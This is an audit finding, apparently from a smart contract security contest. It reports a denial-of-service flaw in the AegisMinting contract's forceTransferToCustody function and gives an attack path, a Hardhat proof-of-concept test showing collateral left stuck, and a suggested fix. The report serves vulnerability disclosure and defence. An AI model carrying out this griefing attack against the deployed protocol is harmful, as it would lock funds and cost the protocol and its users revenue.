# Denial of service affecting protocol critical `forceTransferToCustody` function

### Summary

Users can engineer a coordinated attack that renders the `forceTransferToCustody` function of the AegisMinting contract useless for a limited time because of an issue with the `forceTransferToCustody` function where it queries `_custodyAvailableAssetBalance` internally which has a slightly flawed logic with its checks.

### Root Cause

```solidity
function _custodyAvailableAssetBalance(address _asset) internal view returns (uint256) {

@>    uint256 custodyTransferrableFunds = _custodyTransferrableAssetFunds[_asset];

    uint256 balance = IERC20(_asset).balanceOf(address(this));

    if (balance < custodyTransferrableFunds || custodyTransferrableFunds < assetFrozenFunds[_asset]) {
      return 0;
    }
@>    return custodyTransferrableFunds - assetFrozenFunds[_asset];
  }
```

```solidity
function forceTransferToCustody(
    address wallet,
    address asset
  ) external nonReentrant onlyRole(COLLATERAL_MANAGER_ROLE) onlySupportedAsset(asset) onlyCustodianAddress(wallet) {
@>    uint256 availableBalance = _custodyAvailableAssetBalance(asset); // returns 0
    
    if (availableBalance == 0) {
@>      revert NotEnoughFunds(); // @audit then reverts even though we technically have sufficient asset in the contract
    }

    _custodyTransferrableAssetFunds[asset] -= availableBalance;
    IERC20(asset).safeTransfer(wallet, availableBalance);

    emit ForceCustodyTransfer(wallet, asset, availableBalance);
  }
```

From the above code snippets we can note the following:
- If the protocol got 5000 USDC from users minting YUSD and then transferred out that 5000 USDC to the custodian, the ` _custodyTransferrableAssetFunds[_asset];` will go from 5000 USDC to 0.
- Now, when a user makes a redeem request for that 5000 USDC with the intent to burn 5000 YUSD, the protocol can then make a transfer of 5000 USDC back into the AegisMinting contract. This transfer action will not increment `_custodyTransferrableAssetFunds[_asset];`.
- Thus if a user then proceeds to cancel their redeem request, the `_custodyTransferrableAssetFunds[_asset];` will still be zero and the protocol cannot re-allocate this 5000 USDC to the custodian to then use for opening BTC ETFs. Essentially, these 5000 USDC asset will be locked in the contract for the time being indefinitely.

### Internal Pre-conditions

1. User puts in a redeem request
2. Protocol sends assets into the AegisMinting contract
3. User immediately withdraws their redeem request

### External Pre-conditions

There are no external pre-condition for this issue to come into fruition.

### Attack Path

1. Alice mints 1000 YUSD by supplying 1000 USDC (we assume there is no deposit or redeem fee to simplify this bug. We also assume there is an incomeFeeBP of 5%)
2. Protocol puts those funds to Bitcoin ETF shorts use by calling `transferToCustody` to take the backing collateral USDC out of the AegisMinting.sol contract
3. Alice then calls `requestRedeem` to redeem her 1000 YUSD back for 1000 USDC
4. The protocol withdraws the 1000 USDC from the BTC ETF by closing whatever positions they're holding and then making a direct transfer of the USDC into the AegisMinting contract
5. Alice cancels her redeem request by calling `withdrawRedeemRequest` hence getting back her 1000 YUSD. The AegisMinting contract now holds 1000 USDC and intends to take that fund out and put it to use for earning yield aka funding fees for BTC ETF positions
6. The protocol calls `forceTransferToCustody` function which is designed for exactly these kind of scenarios but the call reverts because of the returned `availableBalance` by the internal `_custodyAvailableAssetBalance` call
7. Hence, Alice has griefed the protocol of its critical business proposal that is earning yield aka funding fees from opening BTC ETFs using the supplied collateral backing circulating YUSD. This not only impacts the unique selling point of the protocol but also the protocol cannot earn `incomeFeeBP` now since those collateral have been rendered idle by Alice. When the protocol deposits income earned to mint YUSD to be distrubuted to the users, an income fee is charged also allowing the protocol to earn some percentage of the income or funding fees yield. Hence, because of this DoS vector, the protocol will not be able to take the collateral out to create ETF positions that earn yield. This can be utilized as a coordinated attack by users to grief Aegis and then proceed to sell their YUSD over on DeX swaps.

### Impact

The protocol suffers a DoS for the assets withdrawn from their BTC ETF positions that was intended to facilitate the withdrawal. The `forceTransferToCustody` function that was designed to handle this case by forcing transfers of the total asset - frozen asset to the custodian wallets becomes ineffective and protocol revenue is lost for the time being since the assets are not able to be put to use.

### PoC

Apply the diff below in the `6_aegis_minting_redeem.spec.ts` test file. The `network` import is to allow us simulate the block timestamp moving up, the COLLATERAL_MANAGER_ROLE is to allow us grant the role to the owner to be able to transfer assets to custodians.

```diff
- import { ethers } from 'hardhat'
+ import { ethers, network } from 'hardhat'
```

```diff
import {
  MAX_BPS,
  FUNDS_MANAGER_ROLE,
  OrderType,
  deployFixture,
  insuranceFundAccount,
  signOrder,
  signOrderByWallet,
  encodeString,
  SETTINGS_MANAGER_ROLE,
+  COLLATERAL_MANAGER_ROLE,
  RedeemRequestStatus,
  USD_FEED_ADDRESS,

} from './helpers'
```

Then, paste the test below into the `6_aegis_minting_redeem.spec.ts` test file and run the test.

```solidity
it.only('should revert forceTransferToCustody ', async () => {
        const [owner, sender] = await ethers.getSigners()

        const { aegisMintingContract, aegisMintingAddress, assetContract, assetAddress, yusdContract, aegisConfig } = await loadFixture(deployFixture)

        // Redeem fee BPS
        const feeBP = 500n

        await aegisMintingContract.grantRole(FUNDS_MANAGER_ROLE, owner)
        await aegisMintingContract.grantRole(COLLATERAL_MANAGER_ROLE, owner)
        await aegisMintingContract.grantRole(SETTINGS_MANAGER_ROLE, owner)

        // Admin sets up Redeem fee to feeBPS
        await aegisMintingContract.setRedeemFeeBP(feeBP)

        await aegisConfig['whitelistAddress(address,bool)'](sender, true)

        await assetContract.mint(sender, ethers.parseEther('100'))
        await assetContract.connect(sender).approve(aegisMintingAddress, ethers.parseEther('100'))

        // Set limits
        await aegisMintingContract.grantRole(SETTINGS_MANAGER_ROLE, owner)
        await aegisMintingContract.setRedeemLimits(60, ethers.parseEther('500'))

        const collateralAmount = ethers.parseEther('50')
        const yusdAmount = ethers.parseEther('49.99');

        const blockTime = await time.latest()
        const mintOrder = {
          orderType: OrderType.MINT,
          userWallet: sender.address,
          collateralAsset: assetAddress,
          collateralAmount: collateralAmount,
          yusdAmount: yusdAmount,
          slippageAdjustedAmount: yusdAmount,
          expiry: blockTime + 10000,
          nonce: Date.now(),
          additionalData: encodeString(''),
        }
        const signature = await signOrder(mintOrder, aegisMintingAddress)

        await expect(aegisMintingContract.connect(sender).mint(mintOrder, signature)).not.to.be.reverted

        const insuranceFundAddress = "0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2";

        await expect(aegisMintingContract.connect(owner).addCustodianAddress(insuranceFundAddress)).not.to.be.reverted

        const transferAmount = ethers.parseEther('50')
        await expect(aegisMintingContract.transferToCustody(insuranceFundAddress, assetAddress, transferAmount)).to.emit(aegisMintingContract, 'CustodyTransfer').withArgs(insuranceFundAddress, assetAddress, transferAmount)

        await yusdContract.connect(sender).approve(aegisMintingAddress, ethers.parseEther('100'))

        const requestId = 'test' 
        const redeemOrder = {
          orderType: OrderType.REDEEM,
          userWallet: sender.address,
          collateralAsset: assetAddress,
          collateralAmount: collateralAmount,
          yusdAmount: yusdAmount,
          slippageAdjustedAmount: yusdAmount,
          expiry: blockTime + 10000,
          nonce: Date.now(),
          additionalData: encodeString(requestId),
        }
        const redeemSignature = await signOrder(redeemOrder, aegisMintingAddress)

        await expect(aegisMintingContract.connect(sender).requestRedeem(redeemOrder, redeemSignature)).not.to.be.reverted

        // move block timestamp
        await network.provider.send("evm_increaseTime", [26000])
        await network.provider.send("evm_mine") //

        // Simulate the protocol depositing collateral into the AegisMinting to approve redeem of Alice

        await assetContract.mint(aegisMintingAddress, ethers.parseEther('50'))

        // Alice withdraws her redeem request
        await aegisMintingContract.connect(sender).withdrawRedeemRequest(requestId)

        const assetBalInAegis = await assetContract.balanceOf(aegisMintingAddress)
        console.log("Aegis Minting now has:", assetBalInAegis + " USDC")
        // 50,000,000,000,000,000,000 = 50 USDC/DAI

        await expect(aegisMintingContract.transferToCustody(insuranceFundAddress, assetAddress, transferAmount)).to.be.reverted
        
        await expect(aegisMintingContract.forceTransferToCustody(insuranceFundAccount, assetAddress)).to.be.reverted
        
      })
```

From the simple test case below we can see that 50 USDC is locked in the protocol in this case:
```js
AegisMinting
    #requestRedeem
      error
Aegis Minting now has: 50000000000000000000 USDC
        ✔ should revert forceTransferToCustody  (479ms)


  1 passing (481ms)

```

### Mitigation

One of the many simple fixes is to use the `_untrackedAvailableAssetBalance` function instead of the `_custodyAvailableAssetBalance` function inside the `forceTransferToCustody` function since all we care about is deducting the frozen funds from the current balance before then transferring that. Another way is to make an entire new function that just returns the result of `IERC20(_asset).balanceOf(address(this) - _assetFrozenFunds[_asset]` and then use that function instead for `forceTransferToCustody`
